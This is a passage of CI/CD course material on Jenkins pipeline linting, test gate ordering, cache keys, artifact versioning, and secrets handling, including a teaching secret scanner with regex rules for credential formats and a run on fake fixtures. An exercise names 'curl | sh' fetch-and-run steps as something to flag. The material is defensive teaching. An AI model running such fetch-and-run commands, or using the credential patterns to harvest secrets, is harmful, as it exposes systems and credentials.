    p = lint(open(sys.argv[1]).read()); print("\n".join(p) if p else "OK"); sys.exit(1 if p else 0)

The 11 tests check the example is clean and that each rule fires when its defect is introduced: unbalanced braces (and that braces inside strings and comments are ignored), agent any, missing timeout, missing post, a hard-coded token, a deployment stage with no when, and a secret interpolated into a double-quoted Groovy string. Running it on a copy of the Jenkinsfile where I made agent any, removed the timeout, deleted the when, and added API_TOKEN = "abcdef123456":

'agent any' lets the build run on any node; use labels so builds land on suitable, trusted agents
no timeout() option: a hung build occupies an executor indefinitely
possible hard-coded credential: TOKEN = "abcdef123456"...; use credentials() / withCredentials
stage 'Deploy to staging' looks like a deployment but has no 'when' condition: it would run on every branch

Three bugs were found by my own tests while writing it: the brace-in-string test contained an unbalanced fixture of my own making, the "deployment without when" rule missed because the stage name was inside a string that my comment/string stripper had removed, and the missing-agent rule fired wrongly for agent any (a form my regex did not recognise). A linter of text is only as good as its tests.

docs.title: Pipeline as code, multibranch and webhooks
docs.text: A Multibranch Pipeline job scans a repository, creates a job per branch and pull request that contains a Jenkinsfile, and builds them automatically. Prefer webhooks from the SCM to Jenkins (push notification) over polling. A Pipeline Library (Level 2 · 03, Level 4 · 03) shares common code across Jenkinsfiles. Job DSL and Configuration as Code (JCasC) describe Jenkins itself in files so a controller can be rebuilt (Level 4 · 03).

docs.title: How It Actually Works
docs.text: The controller compiles the Jenkinsfile (a Groovy script run in a restricted "CPS" interpreter that makes pipelines resumable). When a stage needs an agent, the controller's scheduler (the queue) assigns the job to a node matching the label, sends the step instructions over the agent connection (JNLP/WebSocket or SSH), and the agent executes them (sh spawns a shell in the workspace). The state of the pipeline is serialized to disk periodically, so a controller restart can resume running pipelines; this is also why long-running Groovy computation inside the pipeline itself (rather than in sh steps) is discouraged: that code runs on the controller. Workspaces on agents persist between builds unless cleaned (cleanWs()), a difference from GitHub-hosted runners, and a source of "works on the second run" bugs.

docs.title: Common mistakes
docs.text:
• Building on the controller (security and stability risk).
  • agent any and no timeouts.
  • Credentials in the Jenkinsfile or interpolated into Groovy strings.
  • Long Groovy logic in the pipeline instead of scripts executed on the agent.
  • Never cleaning workspaces, so stale files affect builds.
  • Unpinned plugin updates applied in production on a Friday.
  • Pipeline configured in the UI (freestyle jobs) instead of a versioned Jenkinsfile.
  • No backup of the controller's home directory or its configuration as code.

docs.title: Exercise
docs.text:
1. Write a Jenkinsfile for a project you know: checkout, parallel lint and unit tests, package with fingerprinted artifact, deploy only from main, and a post that publishes test reports. Run the linter on it.
  2. Add two lint rules of your own (for example, flag input steps without a timeout, or sh steps that use curl | sh) with failing tests first.
  3. If you can run Jenkins in a container, submit your Jenkinsfile to its validator (POST /pipeline-model-converter/validateJenkinsfile) and compare its verdict with the linter's.
  4. List five things you would put in Jenkins Configuration as Code so the controller can be rebuilt from Git.

docs.title: 05 · Testing Gates and Fast Feedback
docs.text:
A gate is a check that must pass before a change moves on. Most of a pipeline's value comes from which gates it has, in what order, and how much the team trusts them. This lesson covers designing gates for fast, reliable feedback.

What was run

The ordering experiment below ran on minici (this course's local runner; see Lesson 01). No GitHub or Jenkins pipeline was run. Statements about branch protection and required checks describe GitHub's documented behaviour and were not tried. See Lesson 01.

docs.title: The test pyramid, applied to pipelines
docs.text:
Layer Speed Scope Typical count Where in the pipeline Static checks (format, lint, types) seconds Code style and obvious mistakes n/a First Unit tests seconds to a minute One function or class, no network Hundreds to thousands First/second Integration tests minutes Several components, a real database or service Tens to hundreds After unit tests End-to-end / UI tests many minutes The whole system through its interface Few, on critical paths Late, often only on main or staging Non-functional (performance, security scans) minutes to hours Specific qualities Targeted Parallel, or scheduled

Many cheap tests and few expensive ones: the "pyramid". The reverse (an ice-cream cone of mostly slow UI tests) gives slow, flaky pipelines that people stop trusting.

docs.title: Order gates by cost and likelihood of failing
docs.text:
Pipelines should surface problems as early and cheaply as possible. I measured the effect with two pipelines containing the same two jobs: a 3-second "integration" job and a broken "unit" job that fails instantly.

integration first, then unit (unit needs integration):   time to learn about the failure = 3.1 s
unit first, then integration (integration needs unit):   time to learn about the failure = 0.1 s

Same checks, same result, 30 times faster feedback just from ordering (here by a 3 s sleep standing in for a slow suite; real suites differ by minutes). The slower job never even started in the second pipeline, which also saves runner minutes. Generalising: put checks with low cost and high failure rate first; run independent checks in parallel; reserve expensive suites for after cheap ones pass, and consider running them only on main or nightly if the feedback loop is otherwise too slow.

docs.title: Required checks and merge rules
docs.text:
A gate only protects the mainline if merging is blocked when it fails. On GitHub that means branch protection or rulesets with required status checks (and typically required reviews, up-to-date branches, and no bypass for administrators). On Jenkins-driven repositories, the SCM reports the build status and the same rules apply. Considerations:

  • Required checks must always report. If a required job is skipped by a path filter, some configurations leave it "pending" and block the merge; others treat skipped as passing (check your platform's behaviour; Level 2 · 09 returns to this).
  • Require checks by the job name, which makes renaming a job a policy change.
  • Require the branch to be up to date (or use merge queues) so tests ran against the code that will actually land.
  • Keep the gate set small and meaningful: every required check is a potential blocker.

docs.title: What gates can and cannot prove
docs.text:
• Tests demonstrate that specific cases work; they don't prove absence of bugs.
  • Code coverage measures what executed, not what was verified. 90% coverage with no assertions is worthless; use it to find untested areas, not as a target (Level 2 · 06).
  • A green pipeline means "the checks we wrote passed in this environment". Production differs (data, scale, configuration, dependencies), which is why delivery pipelines add smoke tests, canaries and monitoring (Level 3).
  • A gate people bypass is worse than none. If the pipeline is slow or flaky, developers learn to retry until green or ask for overrides.

docs.title: Flaky tests: the trust killer
docs.text: A flaky test passes and fails on the same code. Causes: test order dependence, shared state, timing and sleeps, unmocked network calls, time zones and locale, resource limits on shared runners, nondeterministic data. Consequences: retries hide real failures, and engineers stop believing red. Policy: quarantine a flaky test (move it to a non-blocking job and file a ticket), don't auto-retry silently, and track the flake rate (Level 2 · 05). Detect time-zone sensitivity by running tests under several zones; the demo pipeline in Lesson 01 does exactly that (three TZ values) and all three variants passed.

docs.title: Fast-feedback habits
docs.text:
1. Run what CI runs, locally, before pushing (make check, pre-commit hooks for format and lint).
  2. Pull-request pipelines should finish in minutes. Set a budget (say ten) and treat regressions in pipeline time as bugs.
  3. Parallelise by test shard and by job (Level 2 · 01); cache dependencies (Lesson 06).
  4. Show failures clearly: the first failing assertion, not 3,000 lines of log; upload test reports.
  5. Fail fast within a job too: pytest -x, set -e.
  6. Don't run everything on every change: path filters and affected-only testing in large repositories (Level 2 · 09).

docs.title: Checklist
docs.text:
• Every required check runs on every pull request and fails with a non-zero exit status when it should.
  • The fastest checks run first; the slowest run only after the cheap ones pass.
  • A deliberately failing input exists for each gate, proving the gate can fail.
  • Test output is published even when the job fails.
  • Flaky tests are tracked by name, not discussed in general terms.
  • The pipeline fails when zero tests were collected.
  • The same command runs locally and in CI.
  • Gate configuration lives in the repository, not in a web UI.
  • Someone owns each gate and knows its false-positive rate.
  • Bypassing a gate leaves a record.

docs.title: How It Actually Works
docs.text: A gate is nothing more than an exit code consumed by the orchestrator: the test runner returns non-zero, the step fails, dependent jobs are skipped, and the pipeline reports a failure status to the commit. The social gate is the branch rule that refuses to merge a commit whose required status is not success. Ordering matters because the orchestrator starts a job only when its dependencies succeed, so failing early prevents all later (and costlier) work, exactly what the measurement above showed.

docs.title: Common mistakes
docs.text:
• Slow suites first.
  • Gates that are not required, so a red build can merge.
  • Coverage thresholds as the goal, producing assertion-free tests.
  • Retry-until-green culture.
  • Tests that depend on the network, the clock or each other.
  • End-to-end tests for everything, instead of the critical paths.
  • Skipping the gate for "tiny" changes (including config changes, which cause outages).

docs.title: Exercise
docs.text:
1. Take a pipeline you use, list each gate with its typical runtime and failure rate, and reorder them. Estimate the average time-to-first-failure before and after.
  2. Reproduce the ordering measurement with your own slow and fast jobs in minici.
  3. Run your tests under three time zones and two locales; record any failures.
  4. Write the branch-protection rules you'd apply to main (required checks, reviews, up-to-date, no bypass) and explain what each protects against.

docs.title: 06 · Reproducible Builds and Caching
docs.text:
If the same commit built twice gives different results, nobody can trust the pipeline. And if every build downloads the world, nobody will wait for it. This lesson covers the two forces that pull in opposite directions: reproducibility (be exact about inputs) and speed (don't redo work), and how caching reconciles them when keyed correctly.

What was run

The cache experiment ran on minici (a local teaching runner); GitHub's and Jenkins's cache mechanisms are described from documentation and were not run. The 10 GB per-repository GitHub cache limit is from the Actions limits page. See Lesson 01.

docs.title: What makes a build reproducible
docs.text:
A build is a function: inputs → artifact. It is reproducible when the same inputs always give the same output. The inputs people forget:

Input How to pin it Source code The exact commit SHA (CI checks out the triggering commit) Dependencies Lockfiles (package-lock.json, poetry.lock, go.sum, Cargo.lock) with exact versions and hashes; install with the lockfile (npm ci, pip install --require-hashes), not a fresh resolution Toolchain A pinned version of the compiler/runtime (setup-python with an exact version, a container image digest) Base images image@sha256:... digests, not :latest Build environment A clean workspace and container; no reliance on what a previous build left behind Time and randomness Don't embed timestamps or random IDs in artifacts (or set SOURCE_DATE_EPOCH) Network Fetching "latest" at build time makes the build a function of the internet

Fully bit-for-bit reproducible builds (two machines produce identical bytes) are a stronger goal used for security and supply chain verification (Level 3 · 08); most teams aim first for repeatable builds with pinned inputs.

docs.title: Caching: reuse without lying
docs.text:
A cache stores the result of expensive work (downloaded dependencies, compiled objects, test fixtures) under a key, restoring it on later runs. The danger is a stale cache that silently feeds old inputs to a new build. The discipline: derive the key from everything the cached content depends on.

# GitHub Actions style (not run here): key from the lockfile's hash, with a restore fallback
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
    restore-keys: pip-${{ runner.os }}-

When requirements.txt changes, the hash changes, the exact key misses, and a new cache is saved; restore-keys may restore an older, partially useful cache as a starting point. Keys should include the OS/architecture and tool version when those affect the content.

docs.title: Measured with minici
docs.text:
The demo pipeline caches a libs directory keyed by the hash of requirements.txt (plus the matrix values). Its "install" step takes 2 seconds on a miss. Two consecutive runs:

RUN 1:   deps   success   2.04s   cache=miss      (step output: installed)
RUN 2:   deps   success   0.01s   cache=hit       (step output: restored from cache)

The cache turned a 2.04 s step into 0.01 s. The pytest suite for minici also checks the invalidation behaviour: with an unchanged requirements.txt the second run is a hit, but after changing the file's content the third run is a miss again (test_cache_miss_then_hit). A cache that doesn't invalidate when its inputs change is a bug generator.

docs.title: What to cache, and what not to
docs.text:
Cache Notes Package manager download caches (pip, npm, Maven, Gradle, cargo) Key on lockfile hash; the biggest and safest win Compiled outputs (ccache, Gradle build cache, Bazel remote cache) Content-addressed caches are the most reliable; keys must capture compiler flags and source Docker layers Order Dockerfile instructions from least to most frequently changing (Linux course, Level 4 · 09) Test data and fixtures Only if immutable Do not cache: secrets, whole build outputs you intend to release, anything whose key you can't state Release artifacts are built fresh from a clean state, or from a verified cache

Be aware of limits: GitHub caps cache storage at 10 GB per repository (older entries are evicted), and caches are scoped by branch (a pull request can read the base branch's cache but not siblings'; check the rules for your platform). Cache poisoning is a real attack: a cache written by a low-trust workflow (a fork's pull request) must not be restored by a privileged one (Level 4 · 01).

docs.title: Clean builds as a baseline
docs.text: Always keep a way to build without any cache (a manual run or a nightly job with caches disabled). If the clean build is broken but cached builds pass, a stale cache is hiding it. Time the clean build too: it is your worst-case feedback time and your disaster-recovery speed.

docs.title: Persistent workspaces (Jenkins) and "works the second time"
docs.text: Jenkins agents keep workspaces between builds unless you clean them. Leftover files act as an uncontrolled cache and cause builds that depend on previous state. Either use cleanWs() / skipDefaultCheckout thoughtfully, or use ephemeral agents (containers, cloud VMs) so every build starts clean and you opt in to caching explicitly. GitHub-hosted runners are ephemeral by default.

docs.title: Checklist
docs.text:
• Tool and dependency versions are pinned, not 'latest'.
  • Cache keys include the lockfile hash and the platform.
  • A periodic cold build checks that the cache is not hiding a problem.
  • The pipeline works, more slowly, when the cache is empty.

docs.title: How It Actually Works
docs.text: A cache service is a key-value store of archives: on a miss the job runs normally and, if it succeeds, uploads the paths under the key; on a hit it downloads and unpacks them before the job's steps. minici copies directories into a store named by a 16-hex-digit prefix of a SHA-256 over the matrix values and the contents of the key files, and restores by copying back. Hash-based keys work because equal inputs give equal hashes and changed inputs give different ones, making invalidation automatic. Saving only on success prevents a failed build from poisoning the cache with partial state (the minici code saves only when the job status is success).

docs.title: Common mistakes
docs.text:
• Install without a lockfile (pip install -r with unpinned names, npm install instead of npm ci).
  • Cache keys that don't include what the content depends on (OS, tool version).
  • Caching build outputs you then release.
  • Never testing a clean build.
  • Restoring caches across trust boundaries.
  • Persistent agent workspaces that hide missing declarations.
  • Treating cache hit rate as the goal instead of correctness.

docs.title: Exercise
docs.text:
1. Add a cache: section to a minici job for a directory you generate, then change the key file and confirm a miss; record the timings for miss and hit.
  2. Find a project of yours without a lockfile and add one; compare a fresh install a month apart to see what changed.
  3. Write the cache key you would use for a Maven build with a matrix of two JDK versions on two operating systems.
  4. Build the same Docker image twice from scratch and compare the image digests; list the reasons they might differ.

docs.title: 07 · Artifacts, Registries and Versioning
docs.text:
The product of a pipeline is an artifact: a versioned, immutable package (a tarball, a wheel, a JAR, a container image, a binary) that can be tested, stored, promoted and deployed. Treating the artifact as the unit of delivery, rather than "the code at some commit", is what makes deployments repeatable and rollbacks possible.

What was run

The tar/gzip hashing experiment ran on macOS with tar and Python's tarfile/gzip. GitHub, Jenkins and registry behaviours are described from documentation and were not run. See Lesson 01.

docs.title: Build once, promote the same artifact
docs.text:
commit ──► build ──► artifact v1.4.7 (digest sha256:ab12…) ──► store in registry
                                   │
                                   ├──► deploy to staging  ──► tests pass
                                   └──► deploy the SAME digest to production

If you rebuild for production, you deploy something you never tested: a different timestamp, a newer dependency, a different compiler. The rule: one build, one artifact, promoted through environments by changing configuration, not code. Environment-specific settings come from configuration at deploy/run time (environment variables, config files, secret stores), not from the artifact.

docs.title: Where artifacts live
docs.text:
Kind Examples Notes Pipeline artifact storage GitHub upload/download artifact actions; Jenkins archiveArtifacts Short-lived outputs for passing files between jobs or downloading; retention is configurable and storage-limited by plan Language package registries PyPI, npm, Maven Central, crates.io; private mirrors (Artifactory, Nexus, GitHub Packages) Versioned packages for libraries Container registries Docker Hub, GHCR, ECR, GCR, ACR, Harbor Images addressed by tag and digest Generic object storage S3/GCS buckets with checksums Binaries, installers, release bundles

Use a private registry for anything internal, and mirror public dependencies so a public outage or removal does not break your builds (the left-pad incident style failure).

docs.title: Versioning
docs.text:
Semantic Versioning (MAJOR.MINOR.PATCH): increment MAJOR for incompatible API changes, MINOR for backward-compatible features, PATCH for backward-compatible fixes; pre-release suffixes (1.5.0-rc.1) sort before the release. It is a communication contract, only as good as the discipline behind it. Alternatives: calendar versioning (2026.10.3) for applications released on a cadence; build-number versions (1.4.${BUILD_NUMBER} as in the Jenkinsfile in Lesson 04) for internal services where every build is deployable.

Rules that avoid pain:

  1. Versions are immutable. Never overwrite 1.4.7 with different bytes. Registries that allow re-pushing a tag break everyone who pinned it.
  2. Never deploy latest. It names no particular build, so you can't reproduce, audit or roll back to it.
  3. Pin by digest where you can. A tag is a movable pointer; a digest (sha256:…) identifies exact content.
  4. Embed the commit SHA in the artifact (a VERSION/build-info file, an image label, a --version flag) so any running instance can be traced back to its source.
  5. Generate the version in the pipeline (from a tag, or from the last tag plus commits since), not by hand-editing files.
  6. Tag releases in Git so the source for every artifact exists.

docs.title: Checksums and reproducibility, measured
docs.text:
Publishing a checksum lets anyone verify an artifact. But a checksum is only useful for comparison if builds are deterministic. I tested it on a tiny directory (app/main.py, app/VERSION), building a tar.gz twice with a pause and a file touch in between (no content change):

naive `tar -czf`, built twice:                     a613c133c0ce0ada  vs  9cdda689482d86ca   → DIFFERENT
tar with sorted entries, mtime 0, owner 0 (Python), gzip header still records the output FILE NAME:
                                                   e4bee4d6f5449447  vs  e9d64d71c06c138f   → DIFFERENT
same, with the gzip filename field blanked:         8c946b8cf6b5a134  vs  8c946b8cf6b5a134   → identical
after a real content change (VERSION edited):       a different hash, as it should be

Three separate sources of non-determinism, found one at a time: file modification times and ownership stored in the tar headers, entry ordering (I sorted), and, the one I did not expect, the output file name stored in the gzip header (my first "deterministic" attempt still differed, because I wrote d1.tar.gz and d2.tar.gz, and gzip recorded those names). The working recipe is in src/deterministic_tar.py: sorted entries, fixed mtime/owner/mode, gzip with mtime=0 and an empty filename. Real ecosystems have the same problems at larger scale (embedded build timestamps, absolute paths, parallel compilation order, locale), which is why the "reproducible builds" project exists and why SOURCE_DATE_EPOCH is a convention for setting a fixed build time. For container images, the equivalent is pinning base image digests and avoiding timestamps in layers; tools such as Bazel, Nix and ko are built around it.

docs.title: Metadata that should travel with an artifact
docs.text: Version and commit SHA; build time and the pipeline run URL; the digest/checksum; the list of dependencies (an SBOM; Level 3 · 08); test results and scan reports (attached to the build); and a signature or provenance attestation (Level 3 · 08). With these, you can answer in minutes: what exactly is running in production, where did it come from, what is in it, and is it affected by this vulnerability?

docs.title: Retention and cost
docs.text: Artifacts consume storage. Set retention: keep release artifacts indefinitely (or per your compliance requirement), build artifacts for a short period, and purge failed-build outputs quickly. Container registries need garbage collection of untagged images. Cache and artifact storage are both billed or limited on hosted CI plans (Lesson 03's limits table).

docs.title: Checklist
docs.text:
• Each build produces one artifact, identified by version and digest.
  • The artifact is built once and promoted, never rebuilt per environment.
  • The commit SHA and build ID travel with the artifact as metadata.
  • Retention keeps at least the current and previous release.

docs.title: How It Actually Works
docs.text: An artifact upload is a content store with a name: the CI system stores the files (often compressed) keyed by run ID and artifact name, and a download action fetches them into another job's clean workspace. A container registry stores image layers and a manifest by content digest; a tag is merely a mutable name pointing at a manifest digest, which is why :v1.4.7 can be moved but @sha256:… cannot. Deterministic artifacts matter because every system that wants to say "these are the same bytes" (caches, signature verification, deduplication, rollbacks) compares hashes.

docs.title: Common mistakes
docs.text:
• Rebuilding per environment.
  • Deploying latest or mutable tags.
  • Re-pushing an existing version with new bytes.
  • No traceability from running software to commit and build.
  • Embedding timestamps and absolute paths (non-reproducible).
  • Unlimited artifact retention (storage limits and cost) or too short retention for releases.
  • Treating artifacts and configuration as one, so a config change requires a rebuild.

docs.title: Exercise
docs.text:
1. Build a tar.gz of a directory in your project twice and compare hashes; then make the build deterministic using the recipe above (or your language's tooling).
  2. Add a step to a minici pipeline that writes VERSION with 1.0.${commit} and includes it in the artifact; show where you would read it at run time.
  3. Pick a container image you deploy; find its digest and rewrite the deployment reference to use it. What changes in your update process?
  4. Write a one-paragraph versioning policy for a service and a library you own: scheme, tagging, immutability rules, and who may publish.

docs.title: 08 · Secrets in Pipelines
docs.text:
A pipeline is a machine that holds the keys to your production systems and runs code from many people. That makes secrets handling the highest-stakes part of CI/CD. This lesson covers how secrets leak, the platform mechanisms for supplying them, and a scanner that catches the commonest mistake: a credential committed to the repository.

What was run

The scanner and its 12 pytest tests ran locally; test credentials are fakes (AWS's documented example key id, and a made-up token shape). GitHub secrets/OIDC and Jenkins credentials behaviour is described from documentation and not run. I made no use of any real credential. See Lesson 01.

docs.title: How secrets leak from pipelines
docs.text:
1. Committed to the repository (an .env file, a config, a test fixture). Git history keeps it forever; deleting the file doesn't remove it from history. Treat any committed secret as compromised and rotate it.
  2. Printed in logs (env, set -x, a failing command that echoes its arguments, a verbose SDK).
  3. Passed on command lines, visible to other processes (ps) and often logged.
  4. Exposed to untrusted code: workflows triggered by pull requests from forks that can read secrets, or a malicious/compromised dependency or action that reads the environment.
  5. Baked into artifacts: container image layers, build args, bundled config (Linux course, Level 4 · 09).
  6. Left in caches or workspaces on persistent agents.
  7. Over-privileged: one all-powerful token reused across repositories and environments, so any leak is catastrophic.

docs.title: Supplying secrets properly
docs.text:
Platform Mechanism Notes (from documentation; not run) GitHub Actions Repository, environment and organization secrets, referenced as ${{ secrets.NAME }} Masked in logs when printed verbatim; not passed to workflows from forked pull requests by default; environment secrets can require approval Jenkins Credentials store with withCredentials/credentials() bindings Masked in console output; scope credentials by folder/domain; a build on the controller can reach more than it should Cloud-native A secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault) read at deploy/run time Rotation, audit, fine-grained access

Principles: scope narrowly (per environment, per job), inject late (only into the step that needs it, as an environment variable rather than a command-line argument), prefer short-lived credentials, and rotate on a schedule and on any suspected exposure.

docs.title: Masking is a convenience, not a defence
docs.text: CI systems replace the exact secret string with *** in logs. It fails when the value is transformed (base64-encoded, split, URL-encoded, printed one character at a time), when a secret is multi-line, or when a short value coincides with other text. Never rely on masking to make printing a secret safe. Don't enable shell tracing (set -x) in steps that handle secrets.

docs.title: Prefer identity federation (OIDC) to stored keys
docs.text: Instead of storing a long-lived cloud access key as a CI secret, the CI system can mint a short-lived signed identity token (OIDC) for each job, which the cloud provider exchanges for temporary credentials if the token's claims match a trust policy (repository, branch, environment). GitHub Actions supports this via the id-token: write permission, and the major clouds can trust it; Jenkins has plugins for similar flows (check current availability). Benefits: no long-lived key to leak or rotate, and access is tied to which repo and branch is running. Trust policies must be tight (restrict to a specific repository and the protected branch/environment), or any repository in the organisation could assume the role. Level 4 · 04 returns to this.

docs.title: Pipeline-safe habits
docs.text:
• Give the GITHUB_TOKEN minimal permissions: (Lesson 03).
  • Deployment secrets belong to protected environments with required reviewers, available only to jobs running on protected branches or tags.
  • Don't expose secrets to pull requests from forks; use pull_request (no secrets) for tests, and a separate trusted workflow for anything privileged. Be wary of pull_request_target and workflow_run that check out untrusted code.
  • Run third-party actions and scripts with the least secrets possible; pin them (Level 3 · 08).
  • Separate build and deploy credentials; the build job rarely needs production access.
  • Never pass secrets as build arguments to container builds; use build secret mounts.
  • Use short-lived tokens and rotate; log who accessed which secret (secrets managers can).
  • Scan for leaks continuously: pre-commit, in CI, and in history.

docs.title: A secret scanner (run)
docs.text:
Dedicated tools (gitleaks, trufflehog, GitHub secret scanning with push protection) are far more complete, but a small scanner shows the two techniques: pattern rules for well-known token shapes and a Shannon-entropy heuristic for random-looking strings.

"""A small secret scanner for repositories and pipeline files: pattern rules plus a Shannon-entropy heuristic. Findings are redacted.
It will miss secrets and flag harmless strings; use it to learn the idea, and use gitleaks/trufflehog or GitHub secret scanning in practice."""
import math, re, sys
from collections import Counter
from pathlib import Path

RULES = [
    ("aws-access-key-id", re.compile(r"\b(AKIA|ASIA)[0-9A-Z]{16}\b")),
    ("github-token", re.compile(r"\bgh[pousr]_[A-Za-z0-9]{36,}\b")),
    ("private-key-block", re.compile(r"-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY( BLOCK)?-----")),
    ("slack-token", re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b")),
    ("generic-assignment", re.compile(r"""(?i)\b\w*(password|passwd|secret|api[_-]?key|token)\w*\s*[:=]\s*['"]([^'"\s$]{8,})['"]""")),
    ("url-with-credentials", re.compile(r"\b[a-z][a-z0-9+.-]*://[^/\s:@]+:[^/\s@]{4,}@")),
]
ALLOW = re.compile(r"pragma:\s*allowlist\s*secret|nosecret", re.I)

def entropy(s):
    c = Counter(s); n = len(s); return -sum(v / n * math.log2(v / n) for v in c.values())

def redact(s): return s[:4] + "…" + "*" * 4 if len(s) > 8 else "****"

def scan_text(text, path="<text>"):
    findings = []
    for ln, line in enumerate(text.splitlines(), 1):
        if ALLOW.search(line): continue
        hit = False
        for name, rx in RULES:
            m = rx.search(line)
            if m:
                value = m.group(2) if name == "generic-assignment" else m.group(0)
                if name == "generic-assignment" and re.fullmatch(r"(\$\{\{.*\}\}|<.*>|x+|\*+|changeme|example|your[-_ ].*)", value, re.I): continue     # example values
                findings.append((path, ln, name, redact(value))); hit = True
        if not hit:
            for tok in re.findall(r"[A-Za-z0-9+/=_-]{32,}", line):
                if entropy(tok) > 4.3 and not re.fullmatch(r"[0-9a-f]{32,64}", tok):      # long, random-looking, and not a plain hex digest/commit
                    findings.append((path, ln, "high-entropy-string", redact(tok)))
    return findings

def scan_tree(root, skip=(".git", "node_modules", ".venv")):
    out = []
    for p in sorted(Path(root).rglob("*")):
        if p.is_file() and not any(s in p.parts for s in skip) and p.stat().st_size < 1_000_000:
            try: out += scan_text(p.read_text(), str(p.relative_to(root)))
            except UnicodeDecodeError: pass
    return out

if __name__ == "__main__":
    f = scan_tree(sys.argv[1])
    for path, ln, rule, red in f: print(f"{path}:{ln}: {rule}: {red}")
    print(f"{len(f)} finding(s)"); sys.exit(1 if f else 0)

The 12 tests assert: an AWS-style key id, a GitHub-token-shaped string, a private-key header, db_password = "..." and a URL with embedded credentials are found; example values (${{ secrets.DB_PASSWORD }}, <your-password>, changeme, xxxx) and $ENV_REFERENCES are not; an allowlist comment suppresses a finding; a high-entropy blob is flagged but a 40-character hex commit SHA is not; and findings are redacted so the scanner does not itself leak the secret into the log (only the first four characters appear). Run on a small fixture tree containing a workflow with an inline token, an .env with an AWS-style key and a database URL, and an innocent commit SHA:

.github/workflows/d.yml:3: generic-assignment: abcd…****
app/.env:1: aws-access-key-id: AKIA…****
app/.env:2: url-with-credentials: post…****
3 finding(s)

(The workflow line SAFE: ${{ secrets.API_TOKEN }} and the commit SHA were correctly not flagged.) One test failed on my first attempt: the rule used a word boundary before password, so db_password (an underscore is a word character) was missed. The fix was to allow word characters before and after the keyword. Scanners have false negatives (a secret in an unusual format) and false positives (random IDs); tune them, and treat them as a safety net, not a guarantee.

docs.title: When a secret leaks
docs.text: 1. Revoke/rotate immediately; assume it was seen. 2. Find the exposure window and audit what the credential did (cloud access logs). 3. Remove it from the code, and from history only as cleanup (history rewriting doesn't un-leak a pushed secret). 4. Fix the cause (why it was in the repo, why the scanner didn't block it). 5. Document it.

docs.title: How It Actually Works
docs.text: CI secrets are stored encrypted by the platform and decrypted only when a job is dispatched to a runner, then placed in the job's environment (or a mounted file). The runner registers each secret's value with a log filter that rewrites exact matches to ***. OIDC federation replaces the stored secret with a signed JWT whose claims (sub, repository, ref, environment) the cloud's trust policy verifies against its configuration and exchanges for temporary credentials, so there is nothing long-lived to steal. Scanners work on text: they apply regular expressions and compute entropy H = -Σ p·log2 p over the characters of a candidate string (random base64 scores around 5 to 6 bits per character, English text far less), flagging unusually random tokens.

docs.title: Common mistakes
docs.text:
• Secrets in Git, .env files committed, or fixtures containing real tokens.
  • Echoing environment variables for debugging.
  • One shared, over-privileged token for everything.
  • Exposing secrets to fork pull requests.
  • Long-lived cloud keys where OIDC is available.
  • Relying on log masking.
  • Secrets as Docker build args.
  • No rotation or audit, and no plan for leaks.

docs.title: Exercise
docs.text:
1. Run the scanner over a repository of yours (history too, with git log -p piped in) and triage each finding as real or false.
  2. Add a rule for a token format you use (a Stripe-style key, an internal service token) with a failing test first.
  3. Draft the OIDC trust policy conditions (repository, branch, environment) you'd require before letting a pipeline assume a deployment role.
  4. Write the incident steps for "a cloud key was committed to a public repository 10 minutes ago", in order.

docs.title: 09 · Branching Strategies and Pull Request Checks
docs.text:
How a team uses branches determines how often it integrates, which is the "I" in CI. Pull requests are where pipelines give feedback before code reaches the mainline. This lesson compares strategies and demonstrates a failure that passes every per-branch check.

What was run
